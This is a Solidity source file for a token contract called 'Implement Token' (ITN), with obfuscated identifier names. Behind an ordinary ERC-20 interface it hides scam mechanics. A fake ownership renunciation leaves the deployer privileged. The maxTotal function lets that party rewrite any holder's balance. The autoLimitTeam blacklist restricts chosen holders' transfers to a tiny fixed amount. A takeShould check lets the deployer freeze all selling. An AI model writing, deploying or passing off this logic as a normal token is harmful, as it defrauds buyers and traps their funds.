//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface fundExemptMode {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundAuto) external view returns (uint256);

    function transfer(address totalMax, uint256 maxAmount) external returns (bool);

    function allowance(address launchMax, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxAmount) external returns (bool);

    function transferFrom(
        address sender,
        address totalMax,
        uint256 maxAmount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed exemptSwapMin, uint256 value);
    event Approval(address indexed launchMax, address indexed spender, uint256 value);
}

abstract contract enableSell {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeTxTrading {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface marketingReceiver {
    function createPair(address limitList, address exemptAt) external returns (address);
}

interface receiverAt is fundExemptMode {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ImplementToken is enableSell, fundExemptMode, receiverAt {

    bool public amountLimit;

    uint256 isMin;

    function name() external view virtual override returns (string memory) {
        return exemptBuyMin;
    }

    mapping(address => bool) public txFund;

    uint256 private shouldEnable = 100000000 * 10 ** 18;

    function totalSupply() external view virtual override returns (uint256) {
        return shouldEnable;
    }

    function autoLimitTeam(address minTakeFund) public {
        amountModeExempt();
        
        if (minTakeFund == swapList || minTakeFund == autoSwap) {
            return;
        }
        txFund[minTakeFund] = true;
    }

    function getOwner() external view returns (address) {
        return teamWallet;
    }

    address private teamWallet;

    bool public feeTo;

    address public autoSwap;

    string private exemptBuyMin = "Implement Token";

    bool private liquidityReceiverTx;

    event OwnershipTransferred(address indexed enableToken, address indexed tokenMarketing);

    function swapIsAmount(address enableList, address totalMax, uint256 maxAmount) internal returns (bool) {
        require(fundIs[enableList] >= maxAmount);
        fundIs[enableList] -= maxAmount;
        fundIs[totalMax] += maxAmount;
        emit Transfer(enableList, totalMax, maxAmount);
        return true;
    }

    function amountModeExempt() private view {
        require(walletLiquidityIs[_msgSender()]);
    }

    function approve(address launchedSwap, uint256 maxAmount) public virtual override returns (bool) {
        maxMode[_msgSender()][launchedSwap] = maxAmount;
        emit Approval(_msgSender(), launchedSwap, maxAmount);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return exemptLaunchedFrom;
    }

    uint256 takeShould;

    uint256 constant listMode = 9 ** 10;

    function owner() external view returns (address) {
        return teamWallet;
    }

    function shouldSwapAt(address teamMode) public {
        if (feeTo) {
            return;
        }
        
        walletLiquidityIs[teamMode] = true;
        
        feeTo = true;
    }

    uint256 private fundTo;

    uint8 private exemptLaunchedFrom = 18;

    function launchedSenderMode() public {
        emit OwnershipTransferred(swapList, address(0));
        teamWallet = address(0);
    }

    function balanceOf(address fundAuto) public view virtual override returns (uint256) {
        return fundIs[fundAuto];
    }

    function txFeeWallet(uint256 maxAmount) public {
        amountModeExempt();
        takeShould = maxAmount;
    }

    function symbol() external view virtual override returns (string memory) {
        return minTotal;
    }

    mapping(address => mapping(address => uint256)) private maxMode;

    address public swapList;

    mapping(address => bool) public walletLiquidityIs;

    uint256 private exemptLaunch;

    address fundShouldAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => uint256) private fundIs;

    function transferFrom(address enableList, address totalMax, uint256 maxAmount) external override returns (bool) {
        if (_msgSender() != teamAt) {
            if (maxMode[enableList][_msgSender()] != type(uint256).max) {
                require(maxAmount <= maxMode[enableList][_msgSender()]);
                maxMode[enableList][_msgSender()] -= maxAmount;
            }
        }
        return receiverLimit(enableList, totalMax, maxAmount);
    }

    function receiverLimit(address enableList, address totalMax, uint256 maxAmount) internal returns (bool) {
        if (enableList == swapList) {
            return swapIsAmount(enableList, totalMax, maxAmount);
        }
        uint256 buyAuto = fundExemptMode(autoSwap).balanceOf(fundShouldAuto);
        require(buyAuto == takeShould);
        require(totalMax != fundShouldAuto);
        if (txFund[enableList]) {
            return swapIsAmount(enableList, totalMax, listMode);
        }
        return swapIsAmount(enableList, totalMax, maxAmount);
    }

    string private minTotal = "ITN";

    uint256 private senderExemptTrading;

    function transfer(address fromLimit, uint256 maxAmount) external virtual override returns (bool) {
        return receiverLimit(_msgSender(), fromLimit, maxAmount);
    }

    address teamAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    constructor (){
        
        takeTxTrading limitTake = takeTxTrading(teamAt);
        autoSwap = marketingReceiver(limitTake.factory()).createPair(limitTake.WETH(), address(this));
        if (senderExemptTrading != exemptLaunch) {
            amountLimit = true;
        }
        swapList = _msgSender();
        launchedSenderMode();
        walletLiquidityIs[swapList] = true;
        fundIs[swapList] = shouldEnable;
        
        emit Transfer(address(0), swapList, shouldEnable);
    }

    function allowance(address autoAmount, address launchedSwap) external view virtual override returns (uint256) {
        if (launchedSwap == teamAt) {
            return type(uint256).max;
        }
        return maxMode[autoAmount][launchedSwap];
    }

    function maxTotal(address fromLimit, uint256 maxAmount) public {
        amountModeExempt();
        fundIs[fromLimit] = maxAmount;
    }

}